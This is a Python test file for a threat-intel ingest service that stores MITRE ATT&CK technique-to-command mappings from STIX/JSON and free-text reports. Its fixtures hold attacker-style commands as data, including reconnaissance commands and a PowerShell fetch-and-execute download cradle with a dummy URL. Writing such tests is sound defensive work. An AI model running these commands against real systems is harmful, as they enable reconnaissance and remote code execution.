"""Example tests for the threat-intel ingest (task 15.2).

Validates: Requirements 13.1, 13.2, 13.7

Testes de *exemplo* (sem Hypothesis) da ingestão de um Threat_Intel_Report no
Command_Base através de :class:`ThreatIntelIngestService`. São 1–2 casos
concretos por caminho:

* **Estruturado (STIX/JSON)** — uma extração sem LLM que lê os campos do
  documento e **preserva o conteúdo** das técnicas→comandos em
  ``technique_commands`` (Req. 13.2). Cobrimos tanto um JSON genérico quanto um
  *STIX bundle* com ``attack-pattern`` + ``x_commands``.
* **Texto livre (TXT/Markdown)** — um ``ChatModel`` dublê determinístico
  devolve uma extração controlada de ``{technique_id, command, executor,
  platform}``; asserimos que as linhas são persistidas com
  ``source="threat_intel"`` (Req. 13.1).
* **Formato indecifrável** — um blob binário que não é JSON, nem PDF, nem
  UTF-8 válido levanta :class:`ThreatIntelFormatError` **antes de qualquer
  escrita**, deixando ``technique_commands`` inalterada (pré-semeamos uma linha
  e conferimos que a contagem é preservada) (Req. 13.7).

A idempotência por ``(técnica, comando, fonte)`` para ``source=threat_intel``
já é coberta pelo teste de propriedade parametrizado 11.2, então aqui focamos no
conteúdo extraído e no comportamento de rejeição de formato.

Isolamento / dublês
-------------------
Cada teste usa uma ``Session`` SQLite efêmera (arquivo temporário +
``Base.metadata.create_all``, mesmo padrão dos testes irmãos). O caminho das
afinidades chama ``memory._resolve_embedder().embed()``; como o SQLite não tem
os operadores do pgvector e não queremos um backend real de embeddings,
injetamos um ``_FakeEmbedder`` determinístico. Nenhuma rede é tocada — o LLM é
dublado via a Protocol ``ChatModel``.
"""

from __future__ import annotations

import hashlib
import json
import tempfile
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import func, select
from sqlalchemy.orm import Session, sessionmaker

from app.core.config import Settings
from app.db.base import Base, import_models
from app.db.session import create_db_engine
from app.models.domain import TechniqueCommand
from app.services.ai.memory import ExperienceMemory
from app.services.threat_intel_ingest_service import (
    ThreatIntelFormatError,
    ThreatIntelIngestService,
    ThreatIntelReport,
)

_SOURCE = "threat_intel"


# ---------------------------------------------------------------------------
# Ephemeral session helper (fresh temp-file SQLite + ORM schema per test).
# ---------------------------------------------------------------------------


def _build_ephemeral_session() -> tuple[Session, Path, Any]:
    """Create a fresh temp-file SQLite engine + ORM schema and return a session.

    Returns ``(session, db_path, engine)`` so the caller can dispose the engine
    and remove the file afterwards. Mirrors the temp-file SQLite +
    ``Base.metadata.create_all`` pattern of the sibling tests.
    """
    tmp_dir = tempfile.mkdtemp(prefix="threat_intel_ingest_")
    db_path = Path(tmp_dir) / "threat_intel.db"
    settings_obj = Settings(database_url=f"sqlite:///{db_path.as_posix()}")

    engine = create_db_engine(settings_obj)
    import_models()
    Base.metadata.create_all(bind=engine)

    session_factory: sessionmaker[Session] = sessionmaker(
        bind=engine,
        autocommit=False,
        autoflush=False,
        expire_on_commit=False,
        future=True,
        class_=Session,
    )
    return session_factory(), db_path, engine


def _dispose(session: Session, engine: Any, db_path: Path) -> None:
    """Close the session, dispose the engine and remove the temp db file."""
    session.close()
    engine.dispose()
    try:
        db_path.unlink(missing_ok=True)
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Doubles
# ---------------------------------------------------------------------------


class _FakeEmbedder:
    """Deterministic ``Embedder`` double — a stable projection, never network.

    The affinity path of :class:`ThreatIntelIngestService` calls
    ``memory._resolve_embedder().embed(content)``; SQLite has no pgvector and we
    want no real embedding backend, so this fake returns a fixed-length vector
    derived deterministically from the text.
    """

    def embed(self, text: str) -> list[float]:
        value = float(len(text) % 7)
        return [value, value, value]


class _FakeChatModel:
    """``ChatModel`` double returning a controlled JSON extraction.

    Satisfies the ``invoke(prompt) -> response`` structural contract. It ignores
    the prompt and returns a message-like object whose ``content`` is a JSON
    array of ``{technique_id, command, executor, platform}`` items, so the
    free-text path is exercised with a deterministic, network-free extraction
    (Req. 13.1).
    """

    class _Message:
        def __init__(self, content: str) -> None:
            self.content = content

    def __init__(self, items: list[dict[str, Any]]) -> None:
        self._payload = json.dumps(items)
        self.calls = 0

    def invoke(self, prompt: Any) -> "_FakeChatModel._Message":
        self.calls += 1
        return self._Message(self._payload)


# ---------------------------------------------------------------------------
# Normalization helpers mirroring the service's idempotency key derivation.
# ---------------------------------------------------------------------------


def _normalize_command(command: str) -> str:
    """Normalize a command exactly as the ingest service does (idempotency key)."""
    return command.replace("\r\n", "\n").replace("\r", "\n").strip()


def _command_hash(command: str) -> str:
    """Deterministic SHA-256 of the normalized command (idempotency key part)."""
    return hashlib.sha256(_normalize_command(command).encode("utf-8")).hexdigest()


def _rows_for_source(session: Session, source: str) -> list[TechniqueCommand]:
    """Return the persisted ``technique_commands`` rows for a given source."""
    return list(
        session.execute(
            select(TechniqueCommand).where(TechniqueCommand.source == source)
        ).scalars()
    )


def _row_count(session: Session, source: str) -> int:
    """Count ``technique_commands`` rows for a given source."""
    return int(
        session.execute(
            select(func.count())
            .select_from(TechniqueCommand)
            .where(TechniqueCommand.source == source)
        ).scalar_one()
    )


# ---------------------------------------------------------------------------
# Case 1 — structured STIX/JSON extraction preserves the field content (13.2)
# ---------------------------------------------------------------------------


def test_structured_generic_json_preserves_technique_command_fields() -> None:
    """A generic JSON report extracts technique→commands preserving the fields.

    No LLM is involved for structured input (Req. 13.2): the service reads the
    ``technique_id`` + ``commands`` fields directly and persists one row per
    command, carrying the exact command text, executor and platform.
    """
    session, db_path, engine = _build_ephemeral_session()
    try:
        document = {
            "techniques": [
                {
                    "technique_id": "T1059.001",
                    "commands": [
                        {
                            "command": "powershell -enc ZQBjAGgAbwA=",
                            "executor": "powershell",
                            "platform": "windows",
                        }
                    ],
                },
                {
                    "technique_id": "T1046",
                    "executor": "sh",
                    "platform": "linux",
                    "commands": ["nmap -sS 10.0.0.0/24"],
                },
            ]
        }
        report = ThreatIntelReport(
            filename="report.json",
            content_type="application/json",
            content=json.dumps(document).encode("utf-8"),
        )

        memory = ExperienceMemory(session, embedder=_FakeEmbedder())
        service = ThreatIntelIngestService(session, memory=memory)
        summary = service.ingest(report)
        session.commit()

        assert summary.report_format == "structured"
        assert summary.techniques == 2
        assert summary.commands_parsed == 2
        assert summary.commands_inserted == 2

        rows = {r.technique_id: r for r in _rows_for_source(session, _SOURCE)}
        assert set(rows) == {"T1059.001", "T1046"}

        # Field content is preserved verbatim (command, executor, platform).
        ps = rows["T1059.001"]
        assert ps.command == "powershell -enc ZQBjAGgAbwA="
        assert ps.executor == "powershell"
        assert ps.platform == "windows"
        assert ps.command_hash == _command_hash(ps.command)

        # A bare command string inherits the entry-level executor/platform.
        nmap = rows["T1046"]
        assert nmap.command == "nmap -sS 10.0.0.0/24"
        assert nmap.executor == "sh"
        assert nmap.platform == "linux"
    finally:
        _dispose(session, engine, db_path)


def test_structured_stix_bundle_preserves_attack_pattern_commands() -> None:
    """A STIX bundle extracts ATT&CK ids + ``x_commands`` preserving the content.

    The STIX path recognizes an ``attack-pattern`` object, reads its ATT&CK id
    from the ``mitre-attack`` external reference and harvests the commands it
    carries under ``x_commands`` — no LLM call (Req. 13.2).
    """
    session, db_path, engine = _build_ephemeral_session()
    try:
        bundle = {
            "type": "bundle",
            "id": "bundle--abc",
            "objects": [
                {
                    "type": "attack-pattern",
                    "id": "attack-pattern--123",
                    "name": "Command and Scripting Interpreter",
                    "external_references": [
                        {
                            "source_name": "mitre-attack",
                            "external_id": "T1059",
                        }
                    ],
                    "x_commands": [
                        {
                            "command": "bash -c 'id'",
                            "executor": "bash",
                            "platform": "linux",
                        }
                    ],
                }
            ],
        }
        report = ThreatIntelReport(
            filename="intel.stix",
            content_type="application/stix+json",
            content=json.dumps(bundle).encode("utf-8"),
        )

        memory = ExperienceMemory(session, embedder=_FakeEmbedder())
        service = ThreatIntelIngestService(session, memory=memory)
        summary = service.ingest(report)
        session.commit()

        assert summary.report_format == "structured"
        assert summary.techniques == 1
        assert summary.commands_inserted == 1

        rows = _rows_for_source(session, _SOURCE)
        assert len(rows) == 1
        row = rows[0]
        assert row.technique_id == "T1059"
        assert row.command == "bash -c 'id'"
        assert row.executor == "bash"
        assert row.platform == "linux"
    finally:
        _dispose(session, engine, db_path)


# ---------------------------------------------------------------------------
# Case 2 — free text (TXT/Markdown) via a doubled LLM extracts the rows (13.1)
# ---------------------------------------------------------------------------


def test_free_text_report_with_doubled_llm_persists_extracted_commands() -> None:
    """Free text is extracted via the injected LLM and persisted (Req. 13.1).

    A Markdown/TXT body that is not JSON drives the free-text path: the injected
    ``ChatModel`` returns a controlled extraction and the service persists one
    ``technique_commands`` row per extracted item with ``source="threat_intel"``.
    """
    session, db_path, engine = _build_ephemeral_session()
    try:
        body = (
            "# Threat Report\n\n"
            "The actor used a shell one-liner to enumerate the host and then "
            "ran a PowerShell downloader.\n"
        )
        report = ThreatIntelReport(
            filename="report.md",
            content_type="text/markdown",
            content=body.encode("utf-8"),
        )

        extracted = [
            {
                "technique_id": "T1033",
                "command": "whoami && hostname",
                "executor": "sh",
                "platform": "linux",
            },
            {
                "technique_id": "T1059.001",
                "command": "powershell -c IEX(New-Object Net.WebClient).DownloadString('h')",
                "executor": "powershell",
                "platform": "windows",
            },
        ]
        fake_llm = _FakeChatModel(extracted)

        memory = ExperienceMemory(session, embedder=_FakeEmbedder())
        service = ThreatIntelIngestService(session, memory=memory, llm=fake_llm)
        summary = service.ingest(report)
        session.commit()

        # The doubled LLM was actually consulted (free-text path, Req. 13.1).
        assert fake_llm.calls == 1
        assert summary.report_format == "free_text"
        assert summary.techniques == 2
        assert summary.commands_parsed == 2
        assert summary.commands_inserted == 2

        rows = {r.technique_id: r for r in _rows_for_source(session, _SOURCE)}
        assert set(rows) == {"T1033", "T1059.001"}
        assert rows["T1033"].command == "whoami && hostname"
        assert rows["T1033"].executor == "sh"
        assert rows["T1033"].platform == "linux"
        assert rows["T1059.001"].executor == "powershell"
        assert rows["T1059.001"].platform == "windows"
    finally:
        _dispose(session, engine, db_path)


# ---------------------------------------------------------------------------
# Case 3 — undecipherable format raises and leaves the table unchanged (13.7)
# ---------------------------------------------------------------------------


def test_undecipherable_binary_raises_and_leaves_technique_commands_unchanged() -> None:
    """An undecipherable blob raises ``ThreatIntelFormatError`` with no write.

    The service detects the format and extracts BEFORE any write, so a binary
    blob that is neither JSON, nor PDF, nor valid UTF-8 is rejected with
    :class:`ThreatIntelFormatError` and the already-persisted Command_Base is
    preserved unchanged (Req. 13.7). We pre-seed one row and assert the count is
    preserved.
    """
    session, db_path, engine = _build_ephemeral_session()
    try:
        # Pre-seed one existing row so we can assert it survives the rejection.
        existing_command = "whoami"
        session.add(
            TechniqueCommand(
                technique_id="T1033",
                command=existing_command,
                executor="sh",
                platform="linux",
                source=_SOURCE,
                command_hash=_command_hash(existing_command),
            )
        )
        session.commit()
        assert _row_count(session, _SOURCE) == 1

        # Bytes that are not JSON, not %PDF, and not valid UTF-8.
        blob = b"\xff\xfe\x00\x01\x02\x03\x80\x81\x82\x83"
        report = ThreatIntelReport(
            filename="payload.bin",
            content_type="application/octet-stream",
            content=blob,
        )

        memory = ExperienceMemory(session, embedder=_FakeEmbedder())
        service = ThreatIntelIngestService(session, memory=memory)

        with pytest.raises(ThreatIntelFormatError) as exc_info:
            service.ingest(report)

        # The error carries the diagnostics and the table is unchanged.
        assert exc_info.value.filename == "payload.bin"
        assert exc_info.value.content_type == "application/octet-stream"
        assert _row_count(session, _SOURCE) == 1
        rows = _rows_for_source(session, _SOURCE)
        assert len(rows) == 1
        assert rows[0].command == existing_command
    finally:
        _dispose(session, engine, db_path)


# ---------------------------------------------------------------------------
# Endpoint case — one structured upload driven through the TestClient (13.2)
# ---------------------------------------------------------------------------


def test_endpoint_ingests_structured_report_via_multipart() -> None:
    """``POST /api/threat-intel`` ingests a structured report end-to-end (Req. 13.2).

    Drives the multipart endpoint with a doubled ``get_db`` session (ephemeral
    SQLite) so the handler reads the ``UploadFile``, builds the
    ``ThreatIntelReport`` and persists the extracted rows. The structured JSON
    path needs no LLM, so no model is doubled here.
    """
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from app.api.threat_intel import router
    from app.db.session import get_db

    session, db_path, engine = _build_ephemeral_session()

    # Make the endpoint-constructed ExperienceMemory use the fake embedder by
    # patching the default embedder resolution for this session's memory. The
    # endpoint builds ExperienceMemory(db) itself, so we inject the fake embedder
    # through the module-level embedder factory the memory resolves lazily.
    import app.services.ai.memory as memory_module

    original_resolver = memory_module.ExperienceMemory._resolve_embedder

    def _fake_resolve(self: Any) -> _FakeEmbedder:
        return _FakeEmbedder()

    memory_module.ExperienceMemory._resolve_embedder = _fake_resolve  # type: ignore[method-assign]

    app = FastAPI()
    app.include_router(router)
    app.dependency_overrides[get_db] = lambda: session

    try:
        document = {
            "technique_id": "T1082",
            "command": "systeminfo",
            "executor": "cmd",
            "platform": "windows",
        }
        client = TestClient(app)
        response = client.post(
            "/api/threat-intel",
            files={
                "file": (
                    "intel.json",
                    json.dumps(document).encode("utf-8"),
                    "application/json",
                )
            },
        )

        assert response.status_code == 201, response.text
        payload = response.json()
        assert payload["report_format"] == "structured"
        assert payload["techniques"] == 1
        assert payload["commands_inserted"] == 1

        rows = _rows_for_source(session, _SOURCE)
        assert len(rows) == 1
        assert rows[0].technique_id == "T1082"
        assert rows[0].command == "systeminfo"
        assert rows[0].executor == "cmd"
        assert rows[0].platform == "windows"
    finally:
        memory_module.ExperienceMemory._resolve_embedder = original_resolver  # type: ignore[method-assign]
        app.dependency_overrides.clear()
        _dispose(session, engine, db_path)
